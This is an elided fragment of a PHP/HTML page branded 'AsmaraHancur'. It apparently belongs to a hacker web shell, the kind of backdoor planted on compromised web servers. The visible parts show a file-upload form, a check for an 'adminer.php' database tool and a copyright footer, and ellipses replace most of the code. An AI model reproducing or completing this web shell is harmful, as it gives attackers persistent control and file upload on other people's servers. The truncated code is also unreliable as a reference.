...
<html>
	<head>
		...
		<link rel='icon' href='https://asmarahancur.my.id/images/cans.jpg'>
		<title>xXx AsmaraHancur xXx</title>
...
<input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
	...
	if(file_exists('adminer.php')) {
		...
		</div><center><div class='text-secondary'><hr><font color=white>Copyright &copy; AsmaraHancur</font></div></center>
	</div>
</div>
</body>
</html>
